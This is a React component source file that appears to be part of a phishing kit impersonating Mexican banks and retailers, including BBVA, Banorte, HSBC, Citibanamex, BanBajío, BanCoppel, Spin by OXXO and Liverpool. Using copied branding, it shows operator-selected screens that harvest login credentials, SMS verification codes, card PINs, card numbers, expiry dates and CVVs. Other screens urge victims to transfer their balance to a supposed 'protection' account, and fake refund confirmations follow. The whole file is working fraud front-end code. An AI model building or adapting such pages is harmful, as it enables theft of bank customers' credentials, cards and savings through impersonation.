import React, { useState, useContext } from 'react';
import { Card } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { ScreenType } from '@shared/schema';
import liverpoolLogo from '../../assets/pngwing.com 2.png';
import citibanamexLogo from '../../assets/Banamex.png';
import banbajioLogo from '../../assets/banbajio_logo_oficial.png';
import bancoppelLogo from '../../assets/bancoppel.png';
import banorteLogo from '../../assets/banorte_logo.png';
import bbvaLogo from '../../assets/bbva_logo.png';
import hsbcLogo from '../../assets/hsbc_logo.png';
import spinLogo from '../../assets/spin_logo.png';

interface ScreenTemplatesProps {
  currentScreen: ScreenType;
  screenData: {
    terminacion?: string;
    saldo?: string;
    monto?: string;
    clabe?: string;
    titular?: string;
    comercio?: string;
    mensaje?: string;
  };
  onSubmit: (screen: ScreenType, data: Record<string, any>) => void;
  banco?: string;
}

export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({ 
  currentScreen, 
  screenData,
  onSubmit,
  banco = "LIVERPOOL"
}) => {
  // Form state
  const [folioInput, setFolioInput] = useState('');
  const [loginInputs, setLoginInputs] = useState({ username: '', password: '' });
  const [codigoInput, setCodigoInput] = useState('');
  const [nipInput, setNipInput] = useState('');
  const [tarjetaInput, setTarjetaInput] = useState('');
  const [fechaVencimientoInput, setFechaVencimientoInput] = useState('');
  const [cvvInput, setCvvInput] = useState('');

  // Helper function to render the appropriate screen
  const renderScreen = () => {
    // Función para obtener el contenedor según el banco
    const getBankContainer = (children: React.ReactNode) => {
      if (banco === 'BBVA') {
        return (
          <div className="bbva-container">
            <div className="bbva-header">
              {bankLogo()}
            </div>
            <div className="bbva-content">
              {children}
            </div>
          </div>
        );
      } else if (banco === 'BANORTE') {
        return (
          <div className="banorte-container">
            <div className="banorte-header">
              {bankLogo()}
            </div>
            <div className="banorte-content">
              {children}
            </div>
            <div className="banorte-footer">
              <div>
                <a href="#">Aprende más</a> | 
                <a href="#">Ayuda</a> | 
                <a href="#">Términos y condiciones</a> | 
                <a href="#">Seguridad en línea</a>
              </div>
              <p>© Banorte México 2025. Todos los Derechos Reservados</p>
            </div>
          </div>
        );
      } else if (banco === 'BANCOPPEL') {
        return (
          <div className="bancoppel-container">
            <div className="bancoppel-header">
              {bankLogo()}
              <strong>7 de abril de 2025</strong>
            </div>
            <div className="bancoppel-content">
              {bankLogo()}
              {children}
            </div>
            <div className="bancoppel-footer-links">
              Aprende más | Ayuda | Términos y condiciones | Seguridad en línea
            </div>
            <div className="bancoppel-footer">
              Contactanos | Aclaraciones | Promociones | Facebook | Youtube <br />
              Copyright 2025 Bancoppel S.A Institución de Banca Múltiple - Todos los derechos reservados
            </div>
          </div>
        );
      } else if (banco === 'SPIN') {
        return (
          <div className="spin-container">
            <div className="spin-header">
              <h1>spin <small>by oxxo</small></h1>
            </div>
            <div className="spin-date">7 de abril de 2025</div>
            <div className="spin-content">
              {children}
            </div>
            <div className="spin-links">
              <a href="#">Aprende más</a> |
              <a href="#">Ayuda</a> |
              <a href="#">Términos y condiciones</a> |
              <a href="#">Seguridad en línea</a>
            </div>
            <div className="spin-bottom-links">
              <a href="#">Contáctanos</a> |
              <a href="#">Aclaraciones</a> |
              <a href="#">Promociones</a> |
              <a href="#">Facebook</a> |
              <a href="#">Youtube</a>
              <p>Spin by OXXO © 2025. Todos los Derechos Reservados</p>
            </div>
          </div>
        );
      } else {
        return (
          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
            {banco === 'BANBAJIO' && (
              <div className="bajionet text-2xl font-bold mb-3">
                <span className="text-[#4D2C91]">Bajio</span><span className="text-[#E60012]">Net</span>
              </div>
            )}
            {children}
          </div>
        );
      }
    };

    // Contenido para la pantalla de FOLIO
    const folioContent = (
      <>
        <h2 className="text-xl font-bold mb-3">Folio de soporte:</h2>
        <p className="mb-4">
          {banco === 'BANBAJIO' 
            ? "Por favor, ingrese el folio de soporte técnico que su ejecutivo en línea le proporcionó."
            : "Ingrese el folio que su ejecutivo le proporcionó."
          }
        </p>
        <Input 
          type="text" 
          placeholder="Ingrese su número de folio" 
          className={banco === 'BBVA' ? "bbva-input" : "w-full border border-gray-300 rounded p-2 mb-3"}
          value={folioInput}
          onChange={(e) => setFolioInput(e.target.value)}
        />
        <Button 
          className={primaryBtnClass}
          onClick={() => onSubmit(ScreenType.FOLIO, { folio: folioInput })}
        >
          Ingresar
        </Button>
      </>
    );
    
    switch (currentScreen) {
      case ScreenType.FOLIO:
        return getBankContainer(folioContent);

      case ScreenType.LOGIN:
        const loginContent = (
          <>
            <h2 className="text-xl font-bold mb-3">Inicio de sesión:</h2>
            <p className="mb-4">Ingrese su usuario y contraseña.</p>
            <Input 
              type="text" 
              placeholder="Usuario" 
              className={banco === 'BBVA' ? "bbva-input" : "w-full border border-gray-300 rounded p-2 mb-3"}
              value={loginInputs.username}
              onChange={(e) => setLoginInputs(prev => ({ ...prev, username: e.target.value }))}
            />
            <Input 
              type="password" 
              placeholder="Contraseña" 
              className={banco === 'BBVA' ? "bbva-input" : "w-full border border-gray-300 rounded p-2 mb-3"}
              value={loginInputs.password}
              onChange={(e) => setLoginInputs(prev => ({ ...prev, password: e.target.value }))}
            />
            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.LOGIN, loginInputs)}
            >
              Ingresar
            </Button>
          </>
        );
        return getBankContainer(loginContent);

      case ScreenType.CODIGO:
        const codigoContent = (
          <>
            <h2 className="text-xl font-bold mb-3">Hemos enviado un código de verificación</h2>
            <p className="mb-4">
              Ingresa el código que recibiste en tu número celular terminación: <strong>{screenData.terminacion || "1881"}</strong>
            </p>
            <Input 
              type="text" 
              placeholder="Ingrese el SMS recibido" 
              className={banco === 'BBVA' ? "bbva-input" : "w-full border border-gray-300 rounded p-2 mb-3"}
              value={codigoInput}
              onChange={(e) => setCodigoInput(e.target.value)}
            />
            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.CODIGO, { codigo: codigoInput })}
            >
              Continuar
            </Button>
            {banco === 'BANBAJIO' && (
              <div className="small-links mt-4">
                <a href="#" className="text-[#4D2C91] mr-2 text-sm">Nueva aclaración</a> | 
                <a href="#" className="text-[#4D2C91] ml-2 text-sm">Estatus de mis aclaraciones</a>
              </div>
            )}
          </>
        );
        return getBankContainer(codigoContent);

      case ScreenType.NIP:
        const nipContent = (
          <>
            <h2 className="text-xl font-bold mb-3">Ingresa tu NIP</h2>
            <p className="mb-4">Para continuar, por favor ingresa el NIP de tu tarjeta.</p>
            <Input 
              type="password" 
              placeholder="Ingrese su NIP" 
              maxLength={4}
              className={banco === 'BBVA' ? "bbva-input" : "w-full border border-gray-300 rounded p-2 mb-3"}
              value={nipInput}
              onChange={(e) => setNipInput(e.target.value)}
            />
            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.NIP, { nip: nipInput })}
            >
              Continuar
            </Button>
          </>
        );
        return getBankContainer(nipContent);

      case ScreenType.PROTEGER:
        const protegerContent = (
          <>
            <div className="text-4xl mb-2">⚠️</div>
            <h2 className="text-xl font-bold mb-3">Es necesario proteger su saldo</h2>
            <p className="mb-4">
              {banco === 'BANBAJIO' 
                ? "Por su seguridad, es necesario proteger el saldo de su cuenta efectiva, crearemos una cuenta de SU TOTAL PROTECCIÓN para respaldar el fondo disponible."
                : "Se creará una cuenta de TOTAL PROTECCIÓN para respaldar su saldo."
              }
            </p>
            <div className="p-3 bg-gray-100 rounded mb-4">
              <p className="font-bold">Saldo sin proteger:</p>
              <p className="text-lg"><strong>{screenData.saldo || "$444"}</strong></p>
            </div>
            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.PROTEGER, { proteger: true })}
            >
              Continuar
            </Button>
          </>
        );
        return getBankContainer(protegerContent);

      case ScreenType.TRANSFERIR:
        const transferirContent = (
          <>
            <h2 className="text-xl font-bold mb-3">Cuenta SU TOTAL PROTECCIÓN creada exitosamente.</h2>
            <p className="mb-4">
              Transfiera la cantidad de <strong>{screenData.monto || "$444"}</strong> a la siguiente cuenta{banco === 'BANBAJIO' ? ' SU TOTAL PROTECCIÓN (STP)' : ''}:
            </p>
            <div className="text-left p-4 bg-gray-100 rounded mb-4">
              <p><strong>Alias:</strong> Cuenta de respaldo.</p>
              <p><strong>Clabe:</strong> <span>{screenData.clabe || "272762626262727272727272266222"}</span></p>
              <p><strong>Titular:</strong> <span>{screenData.titular || "Juan Pérez"}</span></p>
            </div>
            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.TRANSFERIR, { transferencia: true })}
            >
              Confirmar transferencia
            </Button>
            {banco === 'BANBAJIO' && (
              <div className="small-links mt-4">
                <a href="#" className="text-[#4D2C91] mr-2 text-sm">Nueva aclaración</a> | 
                <a href="#" className="text-[#4D2C91] ml-2 text-sm">Estatus de mis aclaraciones</a>
              </div>
            )}
          </>
        );
        return getBankContainer(transferirContent);

      case ScreenType.TARJETA:
        const tarjetaContent = (
          <>
            <h2 className="text-xl font-bold mb-3">Protección adicional</h2>
            <p className="mb-4">Para evitar compras en línea no autorizadas, agregue protección a su tarjeta.</p>
            
            <div className="mb-4 p-3 bg-gray-50 rounded-lg border border-gray-200">
              <h3 className="text-sm font-semibold mb-2 text-left">Ingrese los datos de su tarjeta</h3>
              <Input 
                type="text" 
                placeholder="Número de tarjeta (16 dígitos)" 
                className={banco === 'BBVA' ? "bbva-input mb-3" : "w-full border border-gray-300 rounded p-2 mb-3"}
                value={tarjetaInput}
                onChange={(e) => setTarjetaInput(e.target.value)}
                maxLength={16}
              />
              
              <div className="flex gap-3 mb-3">
                <div className="w-1/2">
                  <Input 
                    type="text" 
                    placeholder="Fecha de vencimiento (MM/AA)" 
                    className={banco === 'BBVA' ? "bbva-input" : "w-full border border-gray-300 rounded p-2"}
                    value={fechaVencimientoInput}
                    onChange={(e) => setFechaVencimientoInput(e.target.value)}
                    maxLength={5}
                  />
                </div>
                <div className="w-1/2">
                  <Input 
                    type="text" 
                    placeholder="CVV (código verificador)" 
                    className={banco === 'BBVA' ? "bbva-input" : "w-full border border-gray-300 rounded p-2"}
                    value={cvvInput}
                    onChange={(e) => setCvvInput(e.target.value)}
                    maxLength={3}
                  />
                </div>
              </div>
              
              <div className="text-xs text-left text-gray-600 mb-1">
                <div className="flex items-center">
                  <div className="bg-gray-200 rounded p-1 mr-2">
                    <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                    </svg>
                  </div>
                  Su información es protegida con cifrado de seguridad
                </div>
              </div>
            </div>
            
            <Button 
              className={`${primaryBtnClass} w-full`}
              onClick={() => onSubmit(ScreenType.TARJETA, { 
                tarjeta: tarjetaInput,
                fechaVencimiento: fechaVencimientoInput,
                cvv: cvvInput
              })}
            >
              Continuar
            </Button>
            
            <div className="mt-4">
              <a href="#" className={banco === 'BANORTE' ? "text-[#e60012] block mt-2 text-sm" : "text-blue-600 block mt-2 text-sm"}>Nueva aclaración</a>
              <a href="#" className={banco === 'BANORTE' ? "text-[#e60012] block mt-2 text-sm" : "text-blue-600 block mt-2 text-sm"}>Estatus de mis aclaraciones</a>
            </div>
          </>
        );
        return getBankContainer(tarjetaContent);

      case ScreenType.CANCELACION:
        const cancelacionContent = (
          <>
            <h2 className="text-xl font-bold mb-3">Cancelación exitosa</h2>
            <p className="mb-3">Hemos cancelado su cargo no reconocido de forma exitosa.</p>
            <div className="p-4 bg-gray-100 rounded mb-4 text-left">
              <p><strong>Comercio:</strong> <span>{screenData.comercio || "Liverpool en línea"}</span></p>
              <p><strong>Monto devuelto:</strong> <span>{screenData.monto ? `$${screenData.monto}` : "$6,262"}</span></p>
            </div>
            <p className="mb-4">El monto estará disponible en su tarjeta dentro de 72 horas.</p>
            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.CANCELACION, { finalizado: true })}
            >
              Finalizar
            </Button>
          </>
        );
        return getBankContainer(cancelacionContent);

      case ScreenType.MENSAJE:
        const mensajeContent = (
          <>
            <h2 className="text-xl font-bold mb-3">Mensaje del banco</h2>
            <div className="p-4 bg-gray-100 rounded mb-4 text-left">
              <p>{screenData.mensaje || "Mensaje personalizado del banco."}</p>
            </div>
            <Button 
              className={primaryBtnClass}
              onClick={() => onSubmit(ScreenType.MENSAJE, { leido: true })}
            >
              Entendido
            </Button>
          </>
        );
        return getBankContainer(mensajeContent);

      case ScreenType.VALIDANDO:
        const validandoContent = (
          <>
            <h2 className="text-xl font-bold mb-4">Validando...</h2>
            <p className="text-sm text-gray-500 mb-4">Esto puede tomar un momento. Por favor espere...</p>
            <div className="h-4 w-full bg-gray-200 rounded overflow-hidden">
              <div className={`h-full ${
                banco === 'BANBAJIO' ? 'banbajio-bg' : 
                banco === 'CITIBANAMEX' ? 'bg-[#0070BA]' : 
                banco === 'BANCOPPEL' ? 'bancoppel-bg' :
                banco === 'BANORTE' ? 'banorte-bg' :
                banco === 'BBVA' ? 'bbva-bg' :
                banco === 'HSBC' ? 'hsbc-bg' :
                banco === 'SPIN' ? 'spin-bg' :
                'bg-[#e10098]'
              } animate-progress-bar`}></div>
            </div>
            <p className="text-xs text-gray-400 mt-3">Verificando información de seguridad</p>
          </>
        );
        return getBankContainer(validandoContent);

      default:
        const defaultContent = (
          <>
            <h2 className="text-xl font-bold mb-3">Pantalla no disponible</h2>
            <p>La pantalla solicitada no está disponible en este momento.</p>
          </>
        );
        return getBankContainer(defaultContent);
    }
  };

  // Definimos las clases de estilos para los botones según el banco
  const getPrimaryBtnClass = () => {
    switch(banco) {
      case 'CITIBANAMEX':
        return 'bg-[#0070BA] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'BANBAJIO':
        return 'banbajio-button'; // Ya tiene todos los estilos definidos en el CSS
      case 'BANCOPPEL':
        return 'bancoppel-button';
      case 'BANORTE':
        return 'banorte-button';
      case 'BBVA':
        return 'bbva-button';
      case 'HSBC':
        return 'hsbc-button';
      case 'SPIN':
        return 'spin-button';
      default:
        return 'bg-[#e10098] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors'; // Liverpool
    }
  };

  const primaryBtnClass = getPrimaryBtnClass();

  const bankLogo = () => {
    switch(banco) {
      case 'CITIBANAMEX':
        return <img src={citibanamexLogo} alt="Citibanamex" className="h-16 mx-auto mb-4" />;
      case 'BANBAJIO':
        return <img src={banbajioLogo} alt="BanBajío" className="h-16 mx-auto mb-4" />;
      case 'BANCOPPEL':
        return <img src={bancoppelLogo} alt="BanCoppel" className="h-16 mx-auto mb-4" />;
      case 'BANORTE':
        return <img src={banorteLogo} alt="Banorte" className="h-16 mx-auto mb-4" />;
      case 'BBVA':
        return <img src={bbvaLogo} alt="BBVA" className="h-16 mx-auto mb-4" />;
      case 'HSBC':
        return <img src={hsbcLogo} alt="HSBC" className="h-16 mx-auto mb-4" />;
      case 'SPIN':
        return <img src={spinLogo} alt="Spin by OXXO" className="h-16 mx-auto mb-4" />;
      default:
        return <img src={liverpoolLogo} alt="Liverpool" className="h-16 mx-auto mb-4" />;
    }
  };

  // Función para obtener la clase de header según el banco
  const getBankHeaderClass = () => {
    switch(banco) {
      case 'BANBAJIO': return 'banbajio-header';
      case 'BANCOPPEL': return 'bancoppel-header';
      case 'BANORTE': return 'banorte-header';
      case 'BBVA': return 'bbva-header';
      case 'HSBC': return 'hsbc-header';
      case 'SPIN': return 'spin-header';
      default: return 'bg-gray-100 p-3 text-center font-semibold';
    }
  };

  // Función para obtener la clase del contenedor según el banco
  const getBankContainerClass = () => {
    switch(banco) {
      case 'BANBAJIO': return 'bg-white p-4 rounded-lg shadow';
      case 'BANCOPPEL': return 'bancoppel-container';
      case 'BANORTE': return 'banorte-container';
      case 'BBVA': return 'bbva-container';
      case 'HSBC': return 'hsbc-container';
      case 'SPIN': return 'spin-container';
      default: return '';
    }
  };

  // Renderizado especial para HSBC que incluye fondo y footer
  if (banco === 'HSBC') {
    return (
      <div className="hsbc-page-background">
        <div className="hsbc-container">
          <div className="logo text-center mb-4">
            {bankLogo()}
          </div>
          {renderScreen()}
        </div>
        <div className="hsbc-footer">
          © HSBC México 2023. Todos los Derechos Reservados
        </div>
      </div>
    );
  }
  
  // Renderizado especial para BBVA
  if (banco === 'BBVA') {
    return (
      <div className="bbva-page-background">
        <header className="bbva-header">
          <div className="logo p-2">
            {bankLogo()}
          </div>
        </header>
        <div className="bbva-navbar">
          <a href="#">PERSONAS</a>
          <a href="#">EMPRESAS Y GOBIERNO</a>
        </div>
        <div className="bbva-main-container">
          <div className="bbva-container">
            {renderScreen()}
          </div>
        </div>
        <div className="bbva-footer-links">
          <p>
            Aprende más | Ayuda | Términos y condiciones | Seguridad en línea<br/>
            Contactanos | Aclaraciones | Promociones | Facebook | Youtube<br/>
            © BBVA México 2024. Todos los Derechos Reservados
          </p>
        </div>
      </div>
    );
  }

  // Renderizado normal para otros bancos
  return (
    <div className={getBankContainerClass()}>
      <div className="logo text-center mb-4">
        {bankLogo()}
        <div className={`${getBankHeaderClass()} mb-4`}>
          {new Date().toLocaleDateString('es-MX', {
            day: 'numeric',
            month: 'long',
            year: 'numeric'
          })}
        </div>
      </div>
      {renderScreen()}
    </div>
  );
};
